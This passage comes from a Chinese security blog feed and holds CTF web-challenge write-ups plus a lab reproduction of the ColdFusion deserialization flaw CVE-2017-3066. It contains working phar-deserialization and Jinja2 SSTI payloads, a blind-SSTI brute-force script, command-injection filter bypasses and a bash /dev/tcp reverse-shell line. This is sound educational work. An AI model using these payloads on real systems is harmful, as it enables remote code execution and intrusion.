CTFSHOW"</span>.<span class="keyword">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $b;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($b)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = $b;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">$this</span>-&gt;b)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $c;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($c)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;c = $c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>很基础的序列化，利用类A的<code>__destruct</code>触发<code>__toString()</code>，再触发<code>__invoke()</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pop:A()-&gt;destruct()-&gt;toString()-&gt;invoke()</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#readfile.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'class.php'</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($filename)</span></span>&#123;  </span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/^phar|^smtp|^dict|^zip|file|etc|root|filter|\.\.\//i"</span>,$filename))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"姿势太简单啦，来一点骚的？！"</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'filename'</span>]))&#123;</span><br><span class="line">    $file=$_GET[<span class="string">'filename'</span>];</span><br><span class="line">        <span class="keyword">if</span>(strstr($file, <span class="string">"flag"</span>) || check($file) || strstr($file, <span class="string">"php"</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"这么简单的获得不可能吧？！"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> readfile($file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里可以用phar协议，但是不能出现在开头，所以先用一个<code>compress.zlib://或者compress.zlib2://</code></p><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">'phar.readonly'</span>,<span class="string">'Off'</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $b;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $c;</span><br><span class="line">&#125;</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>);<span class="comment">//后缀名必须为phar</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"GIF89a"</span>.<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>);</span><br><span class="line">$o = <span class="keyword">new</span> A(<span class="string">''</span>);</span><br><span class="line">$o-&gt;a = <span class="keyword">new</span> B(<span class="string">''</span>);</span><br><span class="line">$o-&gt;a-&gt;b = <span class="keyword">new</span> C(<span class="string">'system("ls /");'</span>);</span><br><span class="line">$phar-&gt;setMetadata($o);</span><br><span class="line">$phar-&gt;addFromString(<span class="string">"text.txt"</span>,<span class="string">"test"</span>);<span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><p>上传修改为gif后缀的phar文件，查看文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">compress.zlib:&#x2F;&#x2F;phar:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;phar.gif</span><br></pre></td></tr></table></figure><p>flag在根目录下，修改成读取flag文件的命令再上传，再读取即可</p><h2 id="1024-图片代理"><a href="#1024-图片代理" class="headerlink" title="1024_图片代理"></a>1024_图片代理</h2><h3 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h3><ul><li>gopher打fastcgi</li><li>file://读取文件</li></ul><h3 id="解题过程-2"><a href="#解题过程-2" class="headerlink" title="解题过程"></a>解题过程</h3><p>开题，如图</p><img src="/2020/12/02/1024cup/7.png" class=""><p>url后拼接的像是base64编码之后的路径，尝试读取/etc/passwd</p><img src="/2020/12/02/1024cup/8.png" class=""><p>成功读取到，因为环境是nginx，读一下nginx的配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:&#x2F;&#x2F;&#x2F;etc&#x2F;nginx&#x2F;nginx.conf&#x3D;&gt;ZmlsZTovLy9ldGMvbmdpbngvbmdpbnguY29uZg&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><img src="/2020/12/02/1024cup/9.png" class=""><p>看到最后一行，搭过nginx都应该知道，在这个路径下会有一个default.conf，读取一下</p><img src="/2020/12/02/1024cup/10.png" class=""><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root         &#x2F;var&#x2F;www&#x2F;bushihtml;</span><br><span class="line">index        index.php index.html;</span><br><span class="line">fastcgi_pass   127.0.0.1:9000;</span><br></pre></td></tr></table></figure><p>应该是gopher打fasicgi了，生成的payload如图</p><img src="/2020/12/02/1024cup/11.png" class=""><p>打过去</p><img src="/2020/12/02/1024cup/5.png" class=""><p>可以看到一串类似flag的东西，读取一下</p><img src="/2020/12/02/1024cup/6.png" class=""><p>提示文件名就是flag，flag到手</p><h2 id="1024-hello-world"><a href="#1024-hello-world" class="headerlink" title="1024_hello_world"></a>1024_hello_world</h2><h3 id="知识点-3"><a href="#知识点-3" class="headerlink" title="知识点"></a>知识点</h3><ul><li>SSTI</li><li>盲注</li></ul><h3 id="解题过程-3"><a href="#解题过程-3" class="headerlink" title="解题过程"></a>解题过程</h3><p>开题，提示post传参key</p><p>测试，应该是ssti，发现下划线被过滤了，进制绕过</p><p>之后就是找到能够有os模块的，这里要用到盲注来进行字符比较</p><p>直接放exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">strs = string.digits+string.ascii_lowercase+<span class="string">'-&#123;&#125;'</span></span><br><span class="line">url = <span class="string">"http://fe197f70-2d9b-4224-9f8f-6037ac37304b.chall.ctf.show/"</span></span><br><span class="line">cmd = <span class="string">'cat /ctf*'</span></span><br><span class="line">rns = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">200</span>):</span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> strs:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="comment">#'key':'&#123;%if ""["\\x5f\\x5fclass\\x5f\\x5f"]["\\x5f\\x5fbase\\x5f\\x5f"]["\\x5f\\x5fsubclasses\\x5f\\x5f"]()['+str(i)+']["\\x5f\\x5finit\\x5f\\x5f"]["\\x5f\\x5fglobals\\x5f\\x5f"]["\\x5f\\x5fbuiltins\\x5f\\x5f"]["\\x5f\\x5fimport\\x5f\\x5f"]("os")%&#125;ans&#123;%endif%&#125;'</span></span><br><span class="line">            <span class="comment">#能用的下标很多，这里用的是64</span></span><br><span class="line">            <span class="string">'key'</span>: <span class="string">'&#123;%if ""["\\x5f\\x5fclass\\x5f\\x5f"]["\\x5f\\x5fbase\\x5f\\x5f"]["\\x5f\\x5fsubclasses\\x5f\\x5f"]()[64]["\\x5f\\x5finit\\x5f\\x5f"]["\\x5f\\x5fglobals\\x5f\\x5f"]["\\x5f\\x5fbuiltins\\x5f\\x5f"]["\\x5f\\x5fimport\\x5f\\x5f"]("os")["\\x5f\\x5fdict\\x5f\\x5f"]["popen"]("'</span>+cmd+<span class="string">'")["read"]()['</span>+str(i)+<span class="string">']=="'</span>+ch+<span class="string">'"%&#125;ans&#123;%endif%&#125;'</span></span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url=url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'ans'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            rns += ch</span><br><span class="line">            <span class="comment"># print(res.text)</span></span><br><span class="line">            print(rns)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="comment">#flag&#123;8cbdef3c-6508-452e-8989-9552b1d6d0af&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;1024-WEB签到&quot;&gt;&lt;a href=&quot;#1024-WEB签到&quot; class=&quot;headerlink&quot; title=&quot;1024_WEB签到&quot;&gt;&lt;/a&gt;1024_WEB签到
    
    </summary>
    
    
    
      <category term="show" scheme="http://yoursite.com/tags/show/"/>
    
  </entry>
  
  <entry>
    <title>forgivencup</title>
    <link href="http://yoursite.com/2020/12/01/forgivencup/"/>
    <id>http://yoursite.com/2020/12/01/forgivencup/</id>
    <published>2020-12-01T08:29:16.000Z</published>
    <updated>2020-12-01T16:11:28.271Z</updated>
    
    <content type="html"><![CDATA[<p>forgiven your lover!!!<a id="more"></a></p><h2 id="原谅4"><a href="#原谅4" class="headerlink" title="原谅4"></a>原谅4</h2><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><ul><li>文件重定向</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1在文件里面是标准输出，stdout</span><br><span class="line">2是标准错误输出。stderr</span><br><span class="line">0是标准输入,stdin</span><br><span class="line"></span><br><span class="line">标准输入0、输出1、错误2需要分别重定向，一个重定向只能改变它们中的一个</span><br><span class="line">标准输入0和标准输出1可以省略。（当其出现重定向符号左侧时）</span><br><span class="line">文件描述符在重定向符号左侧时直接写即可，在右侧时前面加&amp;</span><br><span class="line">文件描述符与重定向符号之间不能有空格</span><br></pre></td></tr></table></figure><h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><p>做题之前先来小小测试一下</p><img src="/2020/12/01/forgivencup/1.png" class=""><p>可以看到1.sh是正常的shell，能够执行，2.sh是随便写的，不能执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls /flag 2&gt;&amp;1</span><br></pre></td></tr></table></figure><p>根目录下是有flag文件的，所以能够正常执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh /flag 2&gt;&amp;1</span><br></pre></td></tr></table></figure><p>flag文件本身只是一个txt文件，当作shell脚本肯定是不能执行的，这里就会拿出flag中的代码当作命令执行</p><img src="/2020/12/01/forgivencup/2.png" class=""><p>再来看一下</p><p>这里标准错误输出重定位到了标准输出，而标准输出是重定位到了1.txt，所以标准错误输出也就会重定位到1.txt，所以接下来就好做了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">题目源码</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">isset</span>($_GET[<span class="string">'xbx'</span>])?system($_GET[<span class="string">'xbx'</span>]):highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>题目代码很简单，先看一下根目录</p><p>测试发下几乎过滤了所有bash命令，看一下bin文件夹</p><img src="/2020/12/01/forgivencup/3.png" class=""><p>还有个sh，利用上面的重定向符</p><p>这里需要<code>url</code>编码一下，避免被认作参数分隔符</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh /flag 2&gt;&amp;1</span><br></pre></td></tr></table></figure><img src="/2020/12/01/forgivencup/4.png" class=""><p>非预期</p><p>/usr/local/bin下有php，可以执行php代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">php+文件，文件内容会被当成php代码执行，相当于是include</span><br><span class="line">&#x2F;?xbx&#x3D;php &#x2F;flag</span><br><span class="line"></span><br><span class="line">指定根目录，绕过open_basedir</span><br><span class="line">&#x2F;?xbx&#x3D;php -t &#x2F; -r &quot;include(&#39;&#x2F;flag&#39;);&quot;</span><br></pre></td></tr></table></figure><h2 id="原谅5-fastapi2"><a href="#原谅5-fastapi2" class="headerlink" title="原谅5_fastapi2"></a>原谅5_fastapi2</h2><h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h3><ul><li>python=&gt;list清除</li><li>SSTI</li></ul><h3 id="解题过程-1"><a href="#解题过程-1" class="headerlink" title="解题过程"></a>解题过程</h3><p>还是fastapi，先看当前全局变量</p><p>list(calc.<em>_globals_\</em>)或者str(calc.__globals__)</p><img src="/2020/12/01/forgivencup/5.png" class=""><p>有个<code>youdontknow</code>，可以读一下，里面过滤了一下ssti的关键词</p><p>这里可以用到list.clear来清楚，看看清楚之后的</p><img src="/2020/12/01/forgivencup/6.png" class=""><p>到这里基本就结束了，下面可以直接读flag文件也可以常规ssti</p><p>直接读</p><img src="/2020/12/01/forgivencup/7.png" class=""><p>SSTI</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;forgiven your lover!!!
    
    </summary>
    
    
    
      <category term="show" scheme="http://yoursite.com/tags/show/"/>
    
  </entry>
  
  <entry>
    <title>NJUPT2020</title>
    <link href="http://yoursite.com/2020/11/24/NJUPT2020/"/>
    <id>http://yoursite.com/2020/11/24/NJUPT2020/</id>
    <published>2020-11-24T11:46:38.000Z</published>
    <updated>2020-11-24T14:03:38.046Z</updated>
    
    <content type="html"><![CDATA[<p>比赛撞车了，就看了一下签到flask，当时没细看，来复现了<a id="more"></a></p><h2 id="你就是我的master吗"><a href="#你就是我的master吗" class="headerlink" title="你就是我的master吗"></a>你就是我的master吗</h2><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><ul><li>进制绕过</li><li>ssti模板注入</li></ul><h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><p>开题，界面很简单，看一下源码，找到提示<code>?name=master</code></p><img src="/2020/11/24/NJUPT2020/1.png" class=""><p>很熟悉，应该是flask模板注入</p><p>fuzz测试发现过滤了<code>.,&#39;,-,_,关键词class等</code></p><p>之类可以考虑用进制绕过，单引号用双引号代替，关键词可以拼接也可以直接进制替换</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">?name=&#123;&#123;""["\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f"]["\x5f\x5f\x62\x61\x73\x65\x5f\x5f"]["\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f"]()[64]["\x5f\x5f\x69\x6e\x69\x74\x5f\x5f"]["\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f"]["\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f"]["\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f"]("\x6f\x73")["\x70\x6f\x70\x65\x6e"]("ls")["\x72\x65\x61\x64"]()&#125;&#125;</span><br></pre></td></tr></table></figure><img src="/2020/11/24/NJUPT2020/2.png" class="">]]></content>
    
    <summary type="html">
    
      &lt;p&gt;比赛撞车了，就看了一下签到flask，当时没细看，来复现了
    
    </summary>
    
    
    
      <category term="NJUPT" scheme="http://yoursite.com/tags/NJUPT/"/>
    
  </entry>
  
  <entry>
    <title>祥云杯</title>
    <link href="http://yoursite.com/2020/11/22/%E7%A5%A5%E4%BA%91%E6%9D%AF/"/>
    <id>http://yoursite.com/2020/11/22/%E7%A5%A5%E4%BA%91%E6%9D%AF/</id>
    <published>2020-11-22T15:42:59.000Z</published>
    <updated>2020-11-22T16:36:08.361Z</updated>
    
    <content type="html"><![CDATA[<p>趁着比赛环境还没关，记录一下web题<a id="more"></a></p><h2 id="Command"><a href="#Command" class="headerlink" title="Command"></a>Command</h2><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><ul><li>命令执行</li><li>常见WAF绕过</li><li>find-linux</li></ul><h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><p>开题很常见的页面，就是ping，很熟悉了，直接构造命令执行</p><p>过滤了<code>;,空格,cat、tac、more、flag、*等</code>，空格用<code>%09</code>绕过，flag用fla?绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>|ls%<span class="number">09</span>/ <span class="comment">//查看根目录</span></span><br></pre></td></tr></table></figure><img src="/2020/11/22/%E7%A5%A5%E4%BA%91%E6%9D%AF/1.png" class=""><p>根目录下没发现flag，这里用find命令找一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?url=<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>|find%<span class="number">09</span>/%<span class="number">09</span>-name%<span class="number">09</span>?????f???</span><br><span class="line"><span class="comment">//这是队里师傅的，我当时比赛试了几个，最后猜测了一下是flag.txt就出来了正确的路径</span></span><br></pre></td></tr></table></figure><img src="/2020/11/22/%E7%A5%A5%E4%BA%91%E6%9D%AF/2.png" class=""><p>最后读取一下就好了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>|ca\t%<span class="number">09</span>/etc/.findf???/f???.txt</span><br></pre></td></tr></table></figure><img src="/2020/11/22/%E7%A5%A5%E4%BA%91%E6%9D%AF/3.png" class=""><h2 id="easygogogo"><a href="#easygogogo" class="headerlink" title="easygogogo"></a>easygogogo</h2><h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h3><ul><li>目录刺穿</li><li>cookie</li></ul><h3 id="解题过程-1"><a href="#解题过程-1" class="headerlink" title="解题过程"></a>解题过程</h3><p>开题就很眼熟，随便账号就能登录，魔改自BJDCTF3的一道题，但是原题的payload不能用</p><p>先上传一个文件，抓包，修改文件名，记录下生成的cookie</p><img src="/2020/11/22/%E7%A5%A5%E4%BA%91%E6%9D%AF/4.png" class=""><p>然后重新下发一个容器，用同样的账号登录，上传一个正常图片，点击show页面时抓包，替换成记录下来的cookie，在访问，发现flag经过base64编码之后的就会出现在图片源码处，解密后拿到flag</p><img src="/2020/11/22/%E7%A5%A5%E4%BA%91%E6%9D%AF/5.png" class=""><h2 id="flaskbot"><a href="#flaskbot" class="headerlink" title="flaskbot"></a>flaskbot</h2><h3 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h3><ul><li>ssti模板注入</li><li>NaN合法数值</li></ul><h3 id="解题过程-2"><a href="#解题过程-2" class="headerlink" title="解题过程"></a>解题过程</h3><p>开题输入<code></code></p><p>发现报错，开启了debug模式，以为要算pin值，但是师傅们都说没有读取文件的利用点</p><p>后面直到看到了</p><img src="/2020/11/22/%E7%A5%A5%E4%BA%91%E6%9D%AF/6.png" class=""><p>注入点应该在cookie，base64加密之后赋值给cookie，但还不够，这样子只是单纯当作了字符串处理，下面这blacknut师傅给的就很关键</p><img src="/2020/11/22/%E7%A5%A5%E4%BA%91%E6%9D%AF/7.png" class=""><p>也就是说payload编码之后传给user写入cookie，然后猜数字也就是num那里填数字，这里就要用到NaN，具体指代合法的数值，这个之前国赛初赛的时候一道题用到过，纯靠队里师傅提醒</p><p>后面的模板要进行字符串拼接，因为有WAF限制</p><p>最终payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">''</span>.__class__.__base__.__subclasses__()[<span class="number">131</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'ev'</span>+<span class="string">'al'</span>](<span class="string">'__im'</span>+<span class="string">'port__("o'</span>+<span class="string">'s").po'</span>+<span class="string">'pen("cat /super_secret_fl'</span><span class="string">'ag.txt")'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><img src="/2020/11/22/%E7%A5%A5%E4%BA%91%E6%9D%AF/8.png" class=""><h2 id="easyzzz（简单记录，具体待填坑）"><a href="#easyzzz（简单记录，具体待填坑）" class="headerlink" title="easyzzz（简单记录，具体待填坑）"></a>easyzzz（简单记录，具体待填坑）</h2><p>后台地址/admin539/login.php</p><p>管理员账号密码：admin/fuzzy9inve</p><p>登入后台修改模板中的 index.html 为<code>{if:1234567)echo</code>cat /flag<code>;//}{end if}</code>再返回index.html 即可获得flag</p><img src="/2020/11/22/%E7%A5%A5%E4%BA%91%E6%9D%AF/9.png" class="">]]></content>
    
    <summary type="html">
    
      &lt;p&gt;趁着比赛环境还没关，记录一下web题
    
    </summary>
    
    
    
      <category term="祥云杯" scheme="http://yoursite.com/tags/%E7%A5%A5%E4%BA%91%E6%9D%AF/"/>
    
  </entry>
  
  <entry>
    <title>Adobe-ColdFusion反序列化-CVE-2017-3066</title>
    <link href="http://yoursite.com/2020/11/14/Adobe-ColdFusion%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CVE-2017-3066/"/>
    <id>http://yoursite.com/2020/11/14/Adobe-ColdFusion%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CVE-2017-3066/</id>
    <published>2020-11-14T11:14:45.000Z</published>
    <updated>2020-11-14T12:12:23.056Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Adobe-ColdFusion反序列化命令执行"><a href="#Adobe-ColdFusion反序列化命令执行" class="headerlink" title="Adobe-ColdFusion反序列化命令执行"></a>Adobe-ColdFusion反序列化命令执行<a id="more"></a></h2><h3 id="Adobe-ColdFusion简介"><a href="#Adobe-ColdFusion简介" class="headerlink" title="Adobe ColdFusion简介"></a>Adobe ColdFusion简介</h3><p>Adobe ColdFusion是美国Adobe公司的一款动态Web服务器产品，其运行的CFML（ColdFusion Markup Language）是针对Web应用的一种程序设计语言。</p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>Adobe ColdFusion (2016 release) Update 3及之前的版本，ColdFusion 11 Update 11及之前的版本，ColdFusion 10 Update 22及之前的版本。</p><h3 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;vulhub.org&#x2F;#&#x2F;environments&#x2F;coldfusion&#x2F;CVE-2017-3066&#x2F;</span><br><span class="line">centos</span><br><span class="line">docker-compose up -d</span><br><span class="line">这个镜像拉取的比较大，一个G左右，要等挺长时间的</span><br></pre></td></tr></table></figure><p>docker起来之后访问<code>http://your-ip:8500/CFIDE/administrator/index.cfm</code>，会要求输入密码，驶入<code>vulhub</code>就可以用了</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>生成poc</p><p>下载之后，就可以用给的生成poc来生成了，先试试<code>/tmp</code>目录下创建文件</p><p>windows下有问题，不论怎么试都会说找不到<code>com.codewhitesec.coldfusionpwn.ColdFusionPwner</code>主类</p><img src="/2020/11/14/Adobe-ColdFusion%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CVE-2017-3066/1.png" class=""><p>之后尝试放到了kali下面，结果成功了</p><img src="/2020/11/14/Adobe-ColdFusion%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CVE-2017-3066/2.png" class=""><p>接着访问<code>/flex2gateway/amf</code>,burp抓包，这里要注意的是格式，下图所示</p><img src="/2020/11/14/Adobe-ColdFusion%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CVE-2017-3066/3.png" class=""><p>生成的poc要是复制粘贴会有问题，直接用burp导入poc，然后打过去</p><p>进入docker中看一下</p><img src="/2020/11/14/Adobe-ColdFusion%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CVE-2017-3066/4.png" class=""><p>下面可以尝试反弹shell，还是要用到之前一个生成java反弹shell的网站</p><p>然后再在kali中生成poc文件</p><img src="/2020/11/14/Adobe-ColdFusion%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CVE-2017-3066/5.png" class=""><p>下面的步骤跟上面一样，直接看一下监听的端口有没有反弹</p><img src="/2020/11/14/Adobe-ColdFusion%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CVE-2017-3066/6.png" class=""><p>可以看到成功弹回了shell</p><p>反弹shell格式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Adobe-ColdFusion反序列化命令执行&quot;&gt;&lt;a href=&quot;#Adobe-ColdFusion反序列化命令执行&quot; class=&quot;headerlink&quot; title=&quot;Adobe-ColdFusion反序列化命令执行&quot;&gt;&lt;/a&gt;Adobe-ColdFusion反序列化命令执行
    
    </summary>
    
    
    
      <category term="CVE" scheme="http://yoursite.com/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>UNCTF2020</title>
    <link href="http://yoursite.com/2020/11/11/UNCTF2020/"/>
    <id>http://yoursite.com/2020/11/11/UNCTF2020/</id>
    <published>2020-11-11T05:28:54.000Z</published>
    <updated>2020-11-19T14:26:11.498Z</updated>
    
